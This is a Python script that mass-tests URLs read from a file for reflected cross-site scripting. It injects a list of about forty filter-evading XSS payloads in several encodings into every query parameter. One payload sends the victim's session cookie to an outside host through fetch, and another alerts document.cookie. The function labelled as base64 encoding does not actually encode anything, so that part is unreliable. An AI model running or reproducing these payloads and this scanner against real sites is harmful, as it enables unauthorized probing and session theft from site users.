import requests
import urllib.parse
from termcolor import colored

# Starting banner
def banner():
    print(colored("""
  _____  _____  _  __
 |  __ \|  __ \| |/ /
 | |__) | |__) | ' / 
 |  ___/|  ___/|  <  
 | |    | |    | . \ 
 |_|    |_|    |_|\_\ 
    """, 'cyan'))
    print(colored("Made by Ahmad!!", 'green'))

# Advanced Payloads
payloads = [
    "<sCriPt>alert(1)</sCriPt>",
    "<scr<script>ipt>alert(1)</script>",
    "<scr<script>ipt>alert`1`</script>",
    "<sc<script>ript>alert'1'</script>",
    "<IMG SRC=\"javascript:alert(1)\">",
    "<IMG SRC=javascript:alert(1)>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<BODY ONLOAD=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<link rel=stylesheet href='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type=submit>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math href='javascript:alert(1)' xlink:href='javascript:alert(1)'></math>",
    "<isindex action='javascript:alert(1)'><input type=submit>",
    "<x xmlns:svg='http://www.w3.org/2000/svg'><svg:script>alert(1)</svg:script></x>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//\">-->",
    "\"><img src=x onerror=alert(1)>",
    "'';!--\"<XSS>=&{()}",
    "\";!--\"<XSS>=&{()}",
    "<!--<img src=\"javascript:alert(1)\">-->",
    "'';!'<XSS>=&{()}",
    "\"'><img src=x onerror=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "<img src='x' onerror='fetch(`//example.com?c=${document.cookie}`)'>",
    "<svg><script href='data:text/javascript,alert(1)//'></script></svg>",
    "<!--><svg/onload=alert()//",
    "JaVaScRiPt:/*--><img src=x onerror=alert(1)//-->",
    "\";alert(1)//",
    "';alert(1)//",
    "\"><svg onload=alert(1)>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<math><maction xlink:href=\"javascript:alert(1)\">Click here</maction></math>"
]

# Function to encode payloads
def encode_payload(payload):
    # URL encode
    url_encoded = urllib.parse.quote(payload)
    # HTML encode
    html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
    # Base64 encode
    base64_encoded = payload.encode('utf-8').decode('latin1')
    # Unicode encode
    unicode_encoded = payload.encode('unicode_escape').decode('utf-8')
    return [payload, url_encoded, html_encoded, base64_encoded, unicode_encoded]

# Check XSS
def check_xss(url, params):
    print(colored(f"Testing {url} with parameters: {params}", 'yellow'))
    for payload in payloads:
        encoded_payloads = encode_payload(payload)
        for encoded_payload in encoded_payloads:
            test_params = {k: v.replace('XSS', encoded_payload) for k, v in params.items()}
            try:
                response = requests.get(url, params=test_params, timeout=5)
                if encoded_payload in response.text:
                    print(colored(f"[+] Potential XSS found with payload: {encoded_payload}", 'green'))
                else:
                    print(colored(f"[-] No XSS with payload: {encoded_payload}", 'red'))
            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error testing {url}: {e}", 'red'))

# Main function
def main():
    banner()
    file_path = input("Enter path to file containing URLs (e.g., urls.txt): ")

    # Read URLs from file
    try:
        with open(file_path, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(colored("[!] File not found. Please check the file path.", 'red'))
        return

    # Test each URL
    for url in urls:
        # Parse URL and parameters
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        for key in params:
            params[key] = params[key][0]
        check_xss(parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path, params)

if __name__ == "__main__":
    main()
